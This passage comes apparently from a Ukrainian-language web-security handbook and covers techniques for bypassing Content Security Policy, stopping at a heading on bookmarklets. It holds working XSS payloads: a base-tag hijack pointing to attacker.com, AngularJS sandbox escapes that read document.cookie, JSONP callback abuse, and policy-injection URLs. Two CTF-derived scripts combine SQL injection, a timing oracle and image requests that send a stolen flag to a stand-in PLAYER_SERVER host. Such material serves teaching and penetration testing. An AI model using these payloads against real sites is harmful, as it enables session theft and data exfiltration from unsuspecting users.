–®–ª—è—Ö–æ–º **–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –Ω–µ–≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ –≤ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ü—ñ—ó URL –º—ñ–∂ –±—Ä–∞—É–∑–µ—Ä–æ–º —ñ —Å–µ—Ä–≤–µ—Ä–æ–º, –ø—Ä–∞–≤–∏–ª–∞ —à–ª—è—Ö—É –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏**.

–†—ñ—à–µ–Ω–Ω—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –Ω–µ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏ `%2f` —è–∫ `/` –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—É —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ü—ñ—é –º—ñ–∂ –±—Ä–∞—É–∑–µ—Ä–æ–º —ñ —Å–µ—Ä–≤–µ—Ä–æ–º, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ —Ü—ñ—î—ó –ø—Ä–æ–±–ª–µ–º–∏.

–û–Ω–ª–∞–π–Ω –ø—Ä–∏–∫–ª–∞–¥:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### –í–∏–∫–æ–Ω–∞–Ω–Ω—è JS –≤ Iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### –≤—ñ–¥—Å—É—Ç–Ω—ñ–π **base-uri**

–Ø–∫—â–æ –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ **base-uri** –≤—ñ–¥—Å—É—Ç–Ω—è, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ **—Å—Ç–æ—Ä—ñ–Ω–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î —Å–∫—Ä–∏–ø—Ç –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤—ñ–¥–Ω–æ—Å–Ω–æ–≥–æ —à–ª—è—Ö—É** (—è–∫ `<script src="/js/app.js">`) –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º **Nonce**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **base** **tag**, —â–æ–± –∑–º—É—Å–∏—Ç–∏ –π–æ–≥–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** —Å–∫—Ä–∏–ø—Ç –∑ **–≤–∞—à–æ–≥–æ –≤–ª–∞—Å–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞, –¥–æ—Å—è–≥–∞—é—á–∏ XSS.**\
–Ø–∫—â–æ –≤—Ä–∞–∑–ª–∏–≤–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑ **httpS**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ httpS URL –≤ base.
```html
<base href="https://www.attacker.com/">
```
### AngularJS –ø–æ–¥—ñ—ó

–°–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∞ –ø–æ–ª—ñ—Ç–∏–∫–∞, –≤—ñ–¥–æ–º–∞ —è–∫ Content Security Policy (CSP), –º–æ–∂–µ –æ–±–º–µ–∂—É–≤–∞—Ç–∏ JavaScript –ø–æ–¥—ñ—ó. –ü—Ä–æ—Ç–µ, AngularJS –≤–≤–æ–¥–∏—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –ø–æ–¥—ñ—ó —è–∫ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—É. –£ –º–µ–∂–∞—Ö –ø–æ–¥—ñ—ó AngularJS –Ω–∞–¥–∞—î —É–Ω—ñ–∫–∞–ª—å–Ω–∏–π –æ–±'—î–∫—Ç `$event`, —â–æ –ø–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –æ–±'—î–∫—Ç –ø–æ–¥—ñ—ó –±—Ä–∞—É–∑–µ—Ä–∞. –¶–µ–π –æ–±'—î–∫—Ç `$event` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –æ–±—Ö–æ–¥—É CSP. –ó–æ–∫—Ä–µ–º–∞, —É Chrome –æ–±'—î–∫—Ç `$event/event` –º–∞—î –∞—Ç—Ä–∏–±—É—Ç `path`, —â–æ –º—ñ—Å—Ç–∏—Ç—å –º–∞—Å–∏–≤ –æ–±'—î–∫—Ç—ñ–≤, –∑–∞–ª—É—á–µ–Ω–∏—Ö –¥–æ –ª–∞–Ω—Ü—é–≥–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–æ–¥—ñ—ó, –ø—Ä–∏—á–æ–º—É –æ–±'—î–∫—Ç `window` –∑–∞–≤–∂–¥–∏ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –≤ –∫—ñ–Ω—Ü—ñ. –¶—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —î –≤–∏—Ä—ñ—à–∞–ª—å–Ω–æ—é –¥–ª—è —Ç–∞–∫—Ç–∏–∫ –≤—Ç–µ—á—ñ –∑ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ.

–°–ø—Ä—è–º–æ–≤—É—é—á–∏ —Ü–µ–π –º–∞—Å–∏–≤ –¥–æ —Ñ—ñ–ª—å—Ç—Ä–∞ `orderBy`, –º–æ–∂–Ω–∞ —ñ—Ç–µ—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–µ—Ä–º—ñ–Ω–∞–ª—å–Ω–∏–π –µ–ª–µ–º–µ–Ω—Ç (–æ–±'—î–∫—Ç `window`), —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≥–ª–æ–±–∞–ª—å–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é, —Ç–∞–∫—É —è–∫ `alert()`. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥—É —ñ–ª—é—Å—Ç—Ä—É—î —Ü–µ–π –ø—Ä–æ—Ü–µ—Å:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
–¶–µ–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ `ng-focus` –¥–ª—è –≤–∏–∫–ª–∏–∫—É –ø–æ–¥—ñ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `$event.path|orderBy` –¥–ª—è –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó –º–∞—Å–∏–≤–æ–º `path`, —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–±'—î–∫—Ç `window` –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó `alert()`, —Ç–∏–º —Å–∞–º–∏–º —Ä–æ–∑–∫—Ä–∏–≤–∞—é—á–∏ `document.cookie`.

**–ó–Ω–∞–π–¥—ñ—Ç—å —ñ–Ω—à—ñ –æ–±—Ö–æ–¥–∏ Angular –Ω–∞** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS —Ç–∞ –¥–æ–º–µ–Ω —É –±—ñ–ª–æ–º—É —Å–ø–∏—Å–∫—É
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
–ü–æ–ª—ñ—Ç–∏–∫–∞ CSP, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ –∑ –ø–µ–≤–Ω–∏—Ö –¥–æ–º–µ–Ω—ñ–≤ –≤ Angular JS –¥–æ–¥–∞—Ç–∫—É, –º–æ–∂–µ –±—É—Ç–∏ –æ–±—ñ–π–¥–µ–Ω–∞ —á–µ—Ä–µ–∑ –≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ–π –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É —Ç–∞ –ø–µ–≤–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∫–ª–∞—Å—ñ–≤. –î–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ –¥–µ—Ç–∞–ª—å–Ω–æ–º—É –ø–æ—Å—ñ–±–Ω–∏–∫—É, –¥–æ—Å—Ç—É–ø–Ω–æ–º—É –≤ —Ü—å–æ–º—É [git —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

–ü—Ä–∞—Ü—é—é—á—ñ –ø–µ–π–ª–æ–∞–¥–∏:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
–Ü–Ω—à—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –¥–ª—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JSONP –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [**—Ç—É—Ç**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (–¥–µ—è–∫—ñ –∑ –Ω–∏—Ö –±—É–ª–∏ –≤–∏–¥–∞–ª–µ–Ω—ñ –∞–±–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω—ñ)

### –û–±—Ö—ñ–¥ —á–µ—Ä–µ–∑ —Ä–µ–¥–∏—Ä–µ–∫—Ç

–©–æ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ CSP —Å—Ç–∏–∫–∞—î—Ç—å—Å—è –∑ —Ä–µ–¥–∏—Ä–µ–∫—Ç–æ–º –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞? –Ø–∫—â–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç –≤–µ–¥–µ –¥–æ —ñ–Ω—à–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, —è–∫–µ –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ, –≤—ñ–Ω –≤—Å–µ —â–µ –∑–∞–∑–Ω–∞—î –Ω–µ–≤–¥–∞—á—ñ.

–û–¥–Ω–∞–∫, –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –æ–ø–∏—Å—É –≤ [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), —è–∫—â–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç –≤–µ–¥–µ –¥–æ —ñ–Ω—à–æ–≥–æ —à–ª—è—Ö—É, –≤—ñ–Ω –º–æ–∂–µ –æ–±—ñ–π—Ç–∏ –ø–æ—á–∞—Ç–∫–æ–≤—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è.

–û—Å—å –ø—Ä–∏–∫–ª–∞–¥:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
–Ø–∫—â–æ CSP –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `https://www.google.com/a/b/c/d`, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Ä–∞—Ö–æ–≤—É—î—Ç—å—Å—è —à–ª—è—Ö, —Å–∫—Ä–∏–ø—Ç–∏ `/test` —Ç–∞ `/a/test` –±—É–¥—É—Ç—å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ CSP.

–û–¥–Ω–∞–∫, —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π `http://localhost:5555/301` –±—É–¥–µ **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–π –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. –û—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è, **—à–ª—è—Ö –Ω–µ –≤—Ä–∞—Ö–æ–≤—É—î—Ç—å—Å—è**, —ñ **—Å–∫—Ä–∏–ø—Ç –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π**, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –æ–±—Ö–æ–¥—è—á–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è —à–ª—è—Ö—É.

–ó —Ü–∏–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è–º, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —à–ª—è—Ö –≤–∫–∞–∑–∞–Ω–æ –ø–æ–≤–Ω—ñ—Å—Ç—é, –≤—ñ–Ω –≤—Å–µ —â–µ –±—É–¥–µ –æ–±—ñ–π–¥–µ–Ω–æ.

–û—Ç–∂–µ, –Ω–∞–π–∫—Ä–∞—â–µ —Ä—ñ—à–µ–Ω–Ω—è - —Ü–µ –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏, —â–æ–± –≤–µ–±-—Å–∞–π—Ç –Ω–µ –º–∞–≤ –∂–æ–¥–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –¥–æ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —ñ —â–æ–± –Ω–µ –±—É–ª–æ –¥–æ–º–µ–Ω—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤ –ø—Ä–∞–≤–∏–ª–∞—Ö CSP.

### –û–±—Ö—ñ–¥ CSP –∑ –≤–∏—Å—è—á–æ—é —Ä–æ–∑–º—ñ—Ç–∫–æ—é

–ß–∏—Ç–∞—Ç–∏ [—è–∫ —Ç—É—Ç](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; —á–µ—Ä–µ–∑ XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Å–∫—Ä–∏–ø—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–¥—É (XSS –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥), –∞ `img-src *` –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –±—É–¥—å-—è–∫–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑ –±—É–¥—å-—è–∫–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É.

–í–∏ –º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü–µ–π CSP, –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É—é—á–∏ –¥–∞–Ω—ñ —á–µ—Ä–µ–∑ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è (–≤ –¥–∞–Ω–æ–º—É –≤–∏–ø–∞–¥–∫—É XSS –∑–ª–æ–≤–∂–∏–≤–∞—î CSRF, –¥–µ —Å—Ç–æ—Ä—ñ–Ω–∫–∞, –¥–æ—Å—Ç—É–ø–Ω–∞ –±–æ—Ç–æ–º, –º—ñ—Å—Ç–∏—Ç—å SQLi, —ñ –≤–∏—Ç—è–≥—É—î –ø—Ä–∞–ø–æ—Ä —á–µ—Ä–µ–∑ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é, —â–æ–± **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ javascript –∫–æ–¥, –≤—Å—Ç–∞–≤–ª–µ–Ω–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**. –Ø–∫—â–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–æ–±—Ä–∞–∂–µ–Ω—å –∑ Twitter. –í–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏** **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**, **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** –π–æ–≥–æ –≤ Twitter —ñ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ "**unsafe-inline**", —â–æ–± **–≤–∏–∫–æ–Ω–∞—Ç–∏** JS –∫–æ–¥ (—è–∫ –∑–≤–∏—á–∞–π–Ω–∏–π XSS), —è–∫–∏–π **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å** **–∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**, **–≤–∏—Ç—è–≥–Ω–µ** **JS** –∑ –Ω—å–æ–≥–æ —ñ **–≤–∏–∫–æ–Ω–∞—î** **–π–æ–≥–æ**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### –ó —Å–µ—Ä–≤—ñ—Å–Ω–∏–º–∏ –ø—Ä–∞—Ü—ñ–≤–Ω–∏–∫–∞–º–∏

–§—É–Ω–∫—Ü—ñ—è **`importScripts`** —Å–µ—Ä–≤—ñ—Å–Ω–∏—Ö –ø—Ä–∞—Ü—ñ–≤–Ω–∏–∫—ñ–≤ –Ω–µ –æ–±–º–µ–∂–µ–Ω–∞ CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ø–æ–ª—ñ—Ç–∏–∫–∏

**–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

–Ø–∫—â–æ **–ø–∞—Ä–∞–º–µ—Ç—Ä**, –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–π –≤–∞–º–∏, **–≤—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** **–æ–≥–æ–ª–æ—à–µ–Ω–Ω—è** **–ø–æ–ª—ñ—Ç–∏–∫–∏**, —Ç–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏** **–ø–æ–ª—ñ—Ç–∏–∫—É** —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, —â–æ –≤–æ–Ω–∞ —Å—Ç–∞–Ω–µ **–Ω–µ–¥—ñ–π—Å–Ω–æ—é**. –í–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–∑–≤–æ–ª–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç 'unsafe-inline'** –∑ –±—É–¥—å-—è–∫–∏–º –∑ —Ü–∏—Ö –æ–±—Ö–æ–¥—ñ–≤:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
–¢–æ–º—É —â–æ —Ü—è –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ **–ø–µ—Ä–µ–∑–∞–ø–∏—à–µ —ñ—Å–Ω—É—é—á—ñ –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ script-src**.\
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ —Ç—É—Ç: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

–í Edge —Ü–µ –Ω–∞–±–∞–≥–∞—Ç–æ –ø—Ä–æ—Å—Ç—ñ—à–µ. –Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –¥–æ–¥–∞—Ç–∏ –≤ CSP –ª–∏—à–µ —Ü–µ: **`;_`** **Edge** **–≤—ñ–¥–∫–∏–Ω–µ** –≤—Å—é **–ø–æ–ª—ñ—Ç–∏–∫—É**.\
–ü—Ä–∏–∫–ª–∞–¥: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; —á–µ—Ä–µ–∑ XSS (iframe) - –ê—Ç–∞–∫–∞ –∑–∞ —á–∞—Å–æ–º

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ `'unsafe-inline'`\
–¶—å–æ–≥–æ —Ä–∞–∑—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –∂–µ—Ä—Ç–≤—É **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø—ñ–¥ **–≤–∞—à–∏–º –∫–æ–Ω—Ç—Ä–æ–ª–µ–º** —á–µ—Ä–µ–∑ **XSS** –∑ `<iframe`. –¶—å–æ–≥–æ —Ä–∞–∑—É –≤–∏ –∑–º—É—Å–∏—Ç–µ –∂–µ—Ä—Ç–≤—É –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å—Ç–æ—Ä—ñ–Ω–∫–∏, –∑ —è–∫–æ—ó –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é (**CSRF**). –í–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–º—ñ—Å—Ç—É —Å—Ç–æ—Ä—ñ–Ω–∫–∏, –∞–ª–µ —è–∫—â–æ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —á–∞—Å, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –ø–æ—Ç—Ä—ñ–±–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

–¶—å–æ–≥–æ —Ä–∞–∑—É –±—É–¥–µ –≤–∏—Ç—è–≥–Ω—É—Ç–æ **–ø—Ä–∞–ø–æ—Ä**, –∫–æ–ª–∏ **—Å–∏–º–≤–æ–ª –±—É–¥–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–≥–∞–¥–∞–Ω–æ** —á–µ—Ä–µ–∑ SQLi, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –∑–∞–π–º–∞—î **–±—ñ–ª—å—à–µ —á–∞—Å—É** —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—é —Å–Ω—É. –¢–æ–¥—ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –ø—Ä–∞–ø–æ—Ä:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

